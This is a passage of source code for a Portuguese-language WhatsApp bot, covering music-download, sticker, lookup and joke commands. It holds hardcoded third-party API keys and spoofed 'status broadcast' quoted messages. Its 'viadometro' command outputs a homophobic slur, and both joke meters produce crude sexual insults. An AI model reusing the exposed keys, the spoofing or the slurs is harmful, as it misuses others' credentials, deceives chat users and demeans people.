enviar (',„ÉÑ,„ÉÉ,„Ç∑,„ÉÑ,Âõß,„Ä†,„ã°,„ãû,„ÉÑ,‡º∫‡ºª,‚ò¨,”Å,‡ºí,‡øê,·üö,‡ºÜ,‰π°,‚éù‚éù‚é†‚é†,‚ñë,‚´∑‚´∏,‡∑¥,‚öî,‚öí')
break
//_CASES PLAY MUSICA 
case 'play':   

if (args.length < 1) return enviar (`Exemplo : ${p}play Paypal`)	
apykeybysayo = 'Skillerofc'  //CONSIGA SUA KEY NESSE SITE = https://api.zeks.xyz/api
enviar("espere....\nse nao enviou em ate 2 min √© porque comando caiu\n\n nao floode o chat enquanto ele procura ") 				 
anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?apikey=${apykeybysayo}&q=${body.slice(5)}`)
if (anu.error) return enviar (anu.error)
infomp3 = `ùêÇùê®ùêß??ùêö ??ùêûùê´ùê¢ùêüùê¢ùêúùêöùêùùêö\n‚ùóMUS√çCA ENCONTRADA\n[‚ùó] enviando sua m√∫sica aguarde..`				
buffer = await getBuffer(`https://api-exteam.herokuapp.com/api/card-spotify?titulo=${encodeURIComponent(anu.result.title)}&author=${encodeURIComponent(anu.result.source)}&album=TOMIOKA-BOT&capa=${anu.result.thumbnail}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": infomp3, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})					
msc = await getBuffer(anu.result.url_audio)				
tomioka.sendMessage(from, msc, audio, {mimetype: 'audio/mp4', filename: `tomioka-bot.mp3`, contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'play1':
enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
teks = body.slice(6)
musica = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?q=${play}&apikey=apivinz`)
buffer1 = await getBuffer(musica.result.thumb)
buffer2 = await getBuffer(musica.result.dl_link)
teks =`ùöàùöò??ùöùùöûùöãùöé ùôøùöïùöäùö¢ ùôºùöûùöúùöíùöå
ùöÑùöúùöûùöäÃÅùöõùöíùöò @${sender.split("@")[0]}
ùöùùöíùöùùöûùöïùöò ${musica.result.title}`
tomioka.sendMessage(from, buffer1, image, {quoted: msg, caption: teks })
tomioka.sendMessage(from, buffer2, MessageType.audio, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "ÍßÅùïãùïÜùïÑùïÄùïÜùïÇ??~ùîπùïÜùïãÍßÇ", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./assets/botlogo.webp')} } }, caption: "<//>" })
break
case 'play2':

if (args.length < 1) return enviar ('Digite o nome da m√∫sica')
enviar('Procurando sua musica..')
anu = await fetchJson(`http://kratosdevofc-api.herokuapp.com/downloads/ytmp3&titulo=${teks}&apikey=tiotomioka`)
if (anu.error) return enviar (anu.error)
//       ingfomp3 = `*Musica encontrada*\n Titulo : ${anu.title}\nCanal: ${anu.channel}\nPublicado: ${anu.published}\nViews: ${anu.views}\n\n*Enviando audioüé∂*`
msg = ('Musica encontrada enviando...\nFonte:YouTube ')
buffer = await getBuffer(anu.thumb)
lagu = await getBuffer(anu.url)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: msg})
tomioka.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', ptt:true})
break
case 'play3':
if (args.length < 1) return enviar ('Digite o nome da m√∫sica')
play = body.slice(6)
enviar('Procurando sua m√∫sica...‚è≥')
anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?apikey=tiotomioka&q=jatuh%20jadi%20resah`)
if (anu.message) return enviar ('M√∫sica n√£o encontrada...\nTente espec√≠ficar o nome dela.')
//aanu = await fetchJson(`https://api-tomioka.italuh.repl.co/api/yta?url=${anu.result.source}`)
aanu = await fetchJson(`https://api-exteam.herokuapp.com/api/yt/playmp3?query=${play}&apikey=estreia`)
infomp3 = 
`    M√öSICA ENCONTRADA
‚Ä£ T√≠tulo: ${anu.result.title}
‚Ä£ Fonte: ${anu.result.source}`
buffer = await getBuffer(anu.result.thumbnail)
//lagu = await getBuffer(anu.result.url_audio)
lagu = await getBuffer(aanu.url)
setTimeout( () => {
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: infomp3})
}, 1500)
enviar('Baixando e enviando sua m√∫sica...')
tomioka.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', quoted: msg})
break
case 'play4':
if (args.length < 1) return enviar ('Digite o link da m√∫sica')
enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
play = body.slice (6)
anu = await fetchJson(`https://enolaholmes.herokuapp.com/api/yutub/audio?url=${play}&apikey=Alphabot`)
//Info = 'Musica\ntitulo ${anu.result.title}\ntamanho ${anu.result.filesize}'
info2 = 'MUSICA ENCONTRADA!!!\nFonte:YouTube\nJa estou te enviando sua musica...'
buffer = await getBuffer(anu.result.thumb)
lagu = await getBuffer(anu.result.result)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: info2})
tomioka.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: msg})

break
case 'play5':
enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson('https://luc4rio.herokuapp.com/api/social/play/audio?video=${body.slice(6)}')
Info = '${anu.Mensagem}\nTitulo ${anu.Titulo_Encontrado} Dura√ß√£o ${anu.Duracao_Do_Video}Fonte ${Link_Do_Video}'
buffer = await getBuffer(anu.Imagem_Do_Video)
lagu = await getBuffer(anu.Link_De_Download)
tomioka.sendMessage(from, buffer, image, {quoted: msg,caption:info})
tomioka.sendMessage(from, lagu, audio, {mimetype:'audio/mp4',filename: '${anu.Titulo_Encontrado}.mp3' , quoted: msg})
break
case  'play6':
teks = body.slice(5)
krat4ss = await fetchJson (`https://api.zeks.xyz/api/ytplaymp4?apikey=apivinz&q=jatuh%20jadi%20resah`)
kratos = await getBuffer(krat4ss.resultado.audio)
enviar('Enviando Aguarde')
tomioka.sendMessage(from, kratos, audio, {quoted: msg})
break
//playe tomiokaa
case 'playe':   
if (!isPremium) return enviar ('s√≥ premium')

if (args.length < 1) return enviar (`Exemplo : ${prefix}play Paypal`)	
apykeybyTomioka = 'TioTomioka'  //CONSIGA SUA KEY NESSE SITE = https://api.zeks.xyz/api
enviar("espere....\nse nao enviou em ate 2 min √© porque comando caiu\n\n nao floode o chat enquanto ele procura ") 				 
anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?apikey=${apykeybyTomioka}&q=${body.slice(5)}`)
if (anu.error) return enviar (anu.error)
infomp3 = `ùêÇùê®ùêßùê≠ùêö ùêïùêûùê´ùê¢ùêüùê¢ùêúùêö????\n‚ùóMUS√çCA ENCONTRADA\n[‚ùó] enviando sua m√∫sica aguarde..`				
buffer = await getBuffer(`https://api-exteam.herokuapp.com/api/card-spotify?titulo=${encodeURIComponent(anu.result.title)}&author=${encodeURIComponent(anu.result.source)}&album=TOMIOKA-BOT&capa=${anu.result.thumbnail}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": infomp3, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})					
msc = await getBuffer(anu.result.url_audio)				
tomioka.sendMessage(from, msc, audio, {mimetype: 'audio/mp4', filename: `tomioka-bot.mp3`, contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'dado2':
if (!isPremium) return enviar ('s√≥ premium')
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
const dadus = ["‚öÄ","‚öÅ","‚öÇ","‚öÉ","‚öÑ","‚öÖ"]
dadu = dadus[Math.floor(Math.random() * dadus.length)]
dador = fs.readFileSync('./database/dados/'+dadu+'.webp')
tomioka.sendMessage(from, dador, sticker, {quoted: msg})
break
case 'gerarnick': 
if (!isPremium) return enviar ('s√≥ premium')
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
teks = body.slice(10)
send = await fetchJson(`http://brizas-api.herokuapp.com/gerador/fancytext?apikey=brizaloka&text=${teks}`)
teks = ` üßôüèª‚Äç‚ôÇÔ∏èNICKS GERADOS COM SUCESSO!üßôüèª‚Äç‚ôÇÔ∏è
üçôPrimeiro ${send.random_1} 
üçôSegundo ${send.random_2} 
üçôT√©rceiro ${send.random_3} 
??Quarto ${send.random_4} 
üçôQuinto ${send.random_5}

üëæEXTRASüëæ
üëæ${send.squares}
üëæ${send.inverted_squares}
üëæ${send.italic}
??${send.bold}
üëæ${send.future_alien}
üëæ${send.asian_1}
üëæ${send.asian_2}
üëæ${send.squiggle}
üëæ${send.squiggle_2}
üëæ${send.squiggle_3}
üëæ${send.squiggle_4}
üëæ${send.neon}


‚û£    ‚ñâ‚ïë‚ñà‚ñê‚ñâ‚ñâ‚ñê‚ñê‚ñç‚ñà‚ïë‚ñç‚ñâ‚ñè‚ñç‚ñç
‚û£    ‚ñâ‚ïë‚ñà‚ñê‚ñâ‚ñâ‚ñê‚ñê‚ñç‚ñà‚ïë‚ñç‚ñâ‚ñè‚ñç‚ñç

¬©·¨â·¨µ‚Éî‚ÉïÕú ‰∫á≈Ç‚ùç ‰∫á‚ùç·õñ≈Ç‚ùç“†‰πà‚ÜØÊÑõ
`
tomioka.sendMessage(from, teks, text, {quoted: msg})
break
case 'button':


    sendButLocation(from, `${prefix}teste`, `sss`, {jpegThumbnail:img}, [{buttonId:``,buttonText:{displayText:'bem vindoüòä'},type:1}])

break      
case 'getpic':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)    
if (args.length < 1) return 

if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar ('Pronto chefe')

mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid[0]

try {

pp = await tomioka.getProfilePicture(mentioned)

buffer = await getBuffer(pp)



//					tomioka.sendMessage(from, buffer, image, {quoted: msg, contextInfo: {"forwardingScore": 999, "isForwarded": true}})

tomioka.sendMessage(from, { name: ``,address: ``,jpegThumbnail: buffer }, MessageType.location)

} catch (e) {

//					await tomioka.sendMessage(from, buffer, image, {quoted: msg, contextInfo: {"forwardingScore": 999, "isForwarded": true}})

tomioka.sendMessage(from, { name: ``,address: ``,jpegThumbnail: buffer }, MessageType.location)

}



break
case 'tts': 
if (!isGroup) return enviar (`[‚ùó] *Ol√° ${pushname} para poder usar os comandos do bot entre nesse grupo:*\n\n‚ûª *GRUPO 1* = ${grupo1}`)
if (args.length < 1) return tomioka.sendMessage(from, 'O C√≥digo de idioma e obrigat√≥rio!!', text, {quoted: msg})					 
if (args.length < 2) return tomioka.sendMessage(from, 'Cad√™ o texto?', text, {quoted: msg})
dtt = body.slice(8)
const gtts = require('./lib/gtts')(args[0])
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
dtt.length > 500
? enviar('O texto e muito grande!!!')
: gtts.save(ranm, dtt, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buffer = fs.readFileSync(rano)
if (err) return enviar ('ERROR')
tomioka.sendMessage(from, buffer, audio, {ptt:true, quoted:msg})
fs.unlinkSync(rano)
})
})
break
//roubar fig linux
case 'roubar':        
case 'rename':
if (!isPremium) return enviar ('s√≥ premium')

txt = args.join(' ')
pack = txt.split('/')[0]
autor = txt.split('/')[1]
fig_mencionada = JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
fig_salvar = await tomioka.downloadMediaMessage(fig_mencionada)
fs.writeFileSync('./tomioka.webp', fig_salvar)
const figenviar = await createSticker('./tomioka.webp', {type: 'full', pack: `${pack}`, author: `${autor}`, categories: ['üåπ']})
tomioka.sendMessage(from, figenviar, sticker)
break
/*case 'roubar':
case 'rename':
if (!isPremium) return enviar ('s√≥ premium')
if (!isQuotedSticker) return enviar ('Apenas figurinha mano')
encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await tomioka.downloadAndSaveMediaMessage(encmedia)
anu = args.join(' ').split('|')
satu = anu[0] !== '' ? anu[0] : `YT`
dua = typeof anu[1] !== 'undefined' ? anu[1] : `TioTomioka`
require('./lib/fetcher.js').createStickerExif(satu, dua)
require('./lib/fetcher.js').modStick(media, tomioka, msg, from)
break*/
case 'pucep':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar ('CadÔøΩ O Cep')
cep = body.slice(6)
send = await fetchJson(`http://brizas-api.herokuapp.com/consulta/cep?apikey=brizaloka&cep=${cep}`) //http://brizas-api.herokuapp.com/consulta/cep?apikey=ObitoSpam&cep=${cep}
teks = `
        
CEP ${send.resultado.cep} 
RUA ${send.resultado.logradouro}  
BAIRRO ${send.resultado.bairro} 
Cidade ${send.resultado.localidade} 
Estado ${send.resultado.uf}  
DDD ${send.resultado.ddd}   

 `
tomioka.sendMessage(from, teks, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('kk/sticker/botlogo.webp')}}}})
break
case 'wikipedia':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
teks = body.slice(11)
send = await fetchJson(`https://api-exteam.herokuapp.com/api/info/wikipedia?search=${teks}&apikey=pip`)
teks = ` ${send.result.result}`
tomioka.sendMessage(from, teks, text, {quoted: msg})
break/*
//github
case 'gitdobot':
case 'git':  
tomioka   

texto = `
O INDEX EST√Å CRIPTOGRAFADO, MAS D√Å PARA ALTERAR IMAGENS, VIDEOS E √ÅUDIOS.

QUISER O INDEX DESCRIPTOGRAFADO, S√ì NEGOCIANDO COM O DONO. 

INSTALA√á√ÉO TERMUX OS PACOTES, S√ì SER√Å NESCESS√ÅRIO UTILIZAR 1 VEZ, AP√ìS O TERMUX INSTALADO.

(LEMBRANDO, TERMUX DA PLAY STORE N√ÉO PRESTA, ENT√ÉO SE TIVER COM O DA PLAY STORE, VAI TER MUITOS ERROS) 

(ALGUMAS DAS VEZES, SER√Å NESCESS√ÅRIO DA ENTER, QUANDO APARECER [DEFAULT=N?]
E SE APARECER Y/N, EM ALGUM DELES, APENAS DIGITE Y E DE ENTER.)


pkg upgrade -y

pkg update -y

pkg install git -y

pkg install nodejs -y

pkg install nodejs-lts -y

termux-setup-storage

-------------‚â†‚â†‚â†=‚â†----------------------

INSTALA√á√ÉO DOS COMANDOS DO BOT.

(COLE UM COMANDO POR 1 !!)

cd /sdcard

git clone https://github.com/GyuuTomioka/TOMIOKABOT

cd TOMIOKABOT

bash install.sh 

npm start

(SDCARD √â O ARMAZENAMENTO INTERNO DO SEU CELULAR, ENT√ÉO A PASTA DO BOT TEM QUE EST√Å L√Å, CASO QUEIRA ALTERAR ALGO, ALTERE L√Å)

===‚â†‚â†‚â†==========================
Lembrando:
Todo aplicativo que instalamos, ele vem com otimiza√ß√£o de bateria, e isso faz o aplicativo fechar ap√≥s sair dele, ou ele parar de funcionar, ou at√© deixa o aplicativo muito lento, ent√£o pra desativar √© o seguinte.
V√° em configura√ß√µes do celular, aplicativos, procure o termux, clique, clique em bateria, vai ter um nome "otimizando a bateria" clique, la encima vai ter um nome "Aplicat. n√£o otimizados" clique, e escolha todos, e procure o termux pesquisando o nome, ou manual, e desative se estiver ativado a otimiza√ß√£o, desative do whatsapp tamb√©m.

=====‚â†‚â†========================
para ligar:

cd /sdcard/TOMIOKABOT

npm start
===============================

Se quiser alterar o video do menu, fica na pasta assets, chamado vidmenu.mp4, s√≥ colocar outro no mesmo lugar com o mesmo nome e substituir.

===‚â†‚â†=============‚â†‚â†==========

Para gerar outro qrcode, voc√™ precisa apagar o arquivo BarBar.json, que fica dentro da pasta do bot, depois ligar normalmente.

=======‚â†‚â†‚â†===========‚â†‚â†========

Meu Canal: https://youtube.com/channel/UC8DcGKSSBm7kv2lXsjAmmMQ

===============================

ACODE DOWNLOAD:
https://www.mediafire.com/download/39o3dijk4tqyk2f

======‚â†‚â†================‚â†‚â†======

TERMUX "VERS√ÉO 117"
PRA ANDROID 7 PRA CIMA: https://www.mediafire.com/download/plyu1fbkc9hpss4

=====‚â†‚â†===========‚â†‚â†============

ZARCHIVER PRO:
https://www.mediafire.com/download/1zoqguo9x5zkapx

=====‚â†‚â†========‚â†‚â†===============
`
tomioka.sendMessage(from, texto, text, {contextInfo: null})
break*/
//_ATTPs	
case 'ttp': //BY SAYO

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)         
if (!isPremium) return enviar ('s√≥ premium')     
if (args.length < 1) return enviar (`cad√™ o texto mano?\nexemplo ${prefix + command} ${pushname}`)

const cor = ["f702ff","ff0202","00ff2e","efff00","00ecff","3100ff","ffb400","ff00b0","00ff95","efff00"] //CORES COLOQUE QUALQUER UMA MAS EM CODE

const fonte = ["Days%20One","Domine","Exo","Fredoka%20One","Gentium%20Basic","Gloria%20Hallelujah","Great%20Vibes","Orbitron","PT%20Serif","Pacifico"]//FONTS N√ÉO MEXA

sayo = cor[Math.floor(Math.random() * (cor.length))]	 				 

sayo2 = fonte[Math.floor(Math.random() * (fonte.length))]	 		

sayo = `https://huratera.sirv.com/PicsArt_08-01-10.00.42.png?profile=Example-Text&text.0.text=${encodeUrl(body.slice(5))}&text.0.outline.color=000000&text.0.outline.blur=0&text.0.outline.opacity=55&text.0.color=${sayo}&text.0.font.family=${sayo2}&text.0.background.color=ff0000`               

sendStickerFromUrl(from, sayo, {quoted: tomio, contextInfo: tome})



break

case 'attp':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 0) return enviar('Cad√™ o texto, hum?')
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
var txt = encodeURI(body.slice(6))
anu = await getBuffer(`https://api.xteam.xyz/attp?file&text=${txt}`)
tomioka.sendMessage( from, anu, sticker, {contextInfo:tome})
break	
case 'attp1':	
if (!isPremium) return enviar ('s√≥ premium')	
if (args.length < 1) return enviar(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc kratos*`)
teks = body.slice(6)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp1?apikey=brizaloka&text=${teks}`)
send = await getBuffer(url)
tomioka.sendMessage(from, send, sticker, {quoted: tomio, contextInfo: tome})
break	     
case 'attp2':	
if (!isPremium) return enviar ('s√≥ premium')	
if (args.length < 1) return enviar(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc kratos*`)
teks = body.slice(6)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp2?apikey=brizaloka&text=${teks}`)
send = await getBuffer(url)
tomioka.sendMessage(from, send, sticker, {quoted: tomio, contextInfo: tome})
break	
case 'attp3': 	
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc kratos*`)
teks = body.slice(6)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp3?apikey=brizaloka&text=${teks}`)
send = await getBuffer(url)
tomioka.sendMessage(from, send, sticker, {quoted: tomio, contextInfo: tome})
break	
case 'attp4': 
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc kratos*`)
teks = body.slice(6)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp4?apikey=brizaloka&text=${teks}`)
send = await getBuffer(url)
tomioka.sendMessage(from, send, sticker, {quoted: tomio, contextInfo: tome})
break	
case 'attp5':	
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc kratos*`)
teks = body.slice(6)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp5?apikey=brizaloka&text=${teks}`)
send = await getBuffer(url)
tomioka.sendMessage(from, send, sticker, {quoted: tomio, contextInfo: tome})
break
case 'attp6':		
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc kratos*`)
teks = body.slice(6)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp6?apikey=brizaloka&text=${teks}`)
send = await getBuffer(url)
tomioka.sendMessage(from, send, sticker, {quoted: tomio, contextInfo: tome})
break
case 'cc':
case 'caracoroa':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
const cara = fs.readFileSync('./database/cara/cara.webp');
const coroa = fs.readFileSync('./database/cara/coroa.webp');
cararo = ["cara", "coroa"]
fej = cararo[Math.floor(Math.random() * cararo.length)]
gg = fej
enviar(`voc√™ conseguiu: ${fej}`)
cararoa = fs.readFileSync('./database/cara/'+fej+'.webp')
tomioka.sendMessage(from, cararoa, sticker, {quoted: msg})
break
case 'sn':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
const sn = ['sim', 'n√£o']
gosto = body.slice(3)
if (args.length < 1) return tomioka.sendMessage(from, `Voc√™ deve fazer uma pergunta...\nExemplo: ${prefix}sn O Tomioka  √© um baiano pregui√ßoso?`, text, {quoted: msg})
const jawab = sn[Math.floor(Math.random() * (sn.length))]
hasil = `${gosto}\n\nSegundo meus c√°lculos, eu acredito que... ${jawab}`
enviar(hasil)
break
case 'gadometro':
case 'gado':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
var chifre = ["ultra extreme gado", "Gado-Master", "Gado-Rei", "Gado", "Escravo-ceta", "Escravo-ceta Maximo", "Gacorno?", "Jogador De Forno Livre<3", "Mestre Do Frifai<3<3", "Gado-Manso", "Gado-Conformado", "Gado-Incubado", "Gado Deus", "Mestre dos Gados", "Topa tudo por buceta", "Gado Comum", "Mini Gadinho", "Gado Iniciante", "Gado Basico", "Gado Intermediario", "Gado Avan√ßado", "Gado Profisional", "Gado Mestre", "Gado Chifrudo", "Corno Conformado", "Corno HiperChifrudo", "Chifrudo Deus", "Mestre dos Chifrudos"]
var gado = chifre[Math.floor(Math.random() * chifre.length)]
gadop = `${Math.floor(Math.random() * 100)}`
hisil = `Voc√™ √©:\n\n${gado}`
enviar(hisil) 
break
case 'viadometro':
case 'viado':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
var chifre = ["ultra extreme viado", "viado-Master", "viado-Rei", "viado", "viado-ceta", "viado-ceta Maximo", "viadao???", "mestredos viados<3", "Mestre Do viados em pessoa<3<3", "viado-Manso", "viado-Conformado", "viado-Incubado", "viado Deus", "Mestre dos viados", "Topa tudo por buceta", "viado Comum", "Mini viadinho", "viado Iniciante", "viado Basico", "viado Intermediario", "viado Avan√ßado", "viado Profisional", "viado Mestre", "viado Chifrudo", "viado Conformado", "viado HiperViad√£o", "viad√£o Deus", "Mestre dos viad√µes"]
var viado = chifre[Math.floor(Math.random() * chifre.length)]
gadop = `${Math.floor(Math.random() * 100)}`
hisil = `Voc√™ √©:\n\n${viado}`
enviar(hisil) 
break

case 'abra√ßo':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('s√≥ grupo')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return 
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
yhb = `Que fofo... @${sender.split("@")[0]} deu um abra√ßo apertado em @${mentioned[0].split('@')[0]}`
mentions(yhb, yhb, true)
break
case 'contar':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (args.length == 0) return enviar ( '0 caracteres, pois obviamente n√£o h√° textoüòÄ')
const count = body.slice(8).length
if (count === 1) {
enviar(`O texto possui ${count} caractere.`)
} else if (count > 1) {
enviar(`O texto possui ${count} caracteres.`)
}
break
case 'membrocm':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, membrocm(prefix, sender), text, {quoted: msg})
break
case 'utils':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, utils(prefix, sender), text, {quoted: msg})
break
case 'imunes':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/imunes.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: imunes(prefix, sender), thumbnail: fs.readFileSync('./assets/imunes.jpg')})
break
case 'metodos':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, metodos(prefix, sender), text, {quoted: msg})
break
/*  case 'compras':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, compras(prefix, sender), text, {quoted: msg})
break*/
case 'pack18':

if (!isPremium) return enviar ('s√≥ premium')
tomioka.sendMessage(from, pack18(prefix, sender), text, {quoted: msg})
break
/*case 'semoji': //cry-bot
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
if (args.length == 0) return enviar(`Usage: ${prefix + command} query\nExample: ${prefix + command} üò≠`)
emoji = args[0]
try {
emoji = encodeURI(emoji[0])
} catch {
emoji = encodeURI(emoji)
}
anu = await fetchJson(`https://api-gdr2.herokuapp.com/api/emoji2png?text=${emoji}`)
buffer = await getBuffer(anu.result)
tomioka.sendMessage(from, buffer, image, { quoted: tomio, contextInfo: tome })
break*/
case 'emoji':
if (!isPremium) return enviar ('s√≥ premium')
if (!q) return enviar('e o emoji?')
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
const emojitext = `${emoji.images[4].url}`
sendStickerFromUrl(from,`${emojitext}`) 
console.log(emojitext)
})
break
case 'emoji2':
if (!isPremium) return enviar ('s√≥ premium')
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
if (args.length == 0) return enviar(`Usage: ${prefix + command} query\nExample: ${prefix + command} üò≠`)
emoji = args[0]
try {
emoji = encodeURI(emoji[0])
} catch {
emoji = encodeURI(emoji)
}
buffer = await getBuffer(`http://api.lolhuman.xyz/api/smoji/${emoji}?apikey=6b25e69d0ba3dc9447010464`)
tomioka.sendMessage(from, buffer, sticker, { quoted: tomio, contextInfo: tome })
break
case 'grupo':
    enviar('https://chat.whatsapp.com/DBgLXf5IqUrAN4NKg9gURc')
//_ MENU PRINCIPAL
case 'menu':
const tempo = speed();
const latencia = speed() - tempo
run = process.uptime() 
teks = `${kyun(run)}`
const menu = `
üéâNOVIDADESüéâ
ñ£î‚û£‚ùß${prefix}sn (sua pergunta)
‚úîUtilidadeÔºçresponder com sim ou n√£o 

ñ£î‚û£‚ùß${prefix}efeitos
‚úîUtilidadeÔºçmostra o menu de efeitos para audio 

ñ£î‚û£‚ùß${prefix}wikipedia (sua pesquisa)
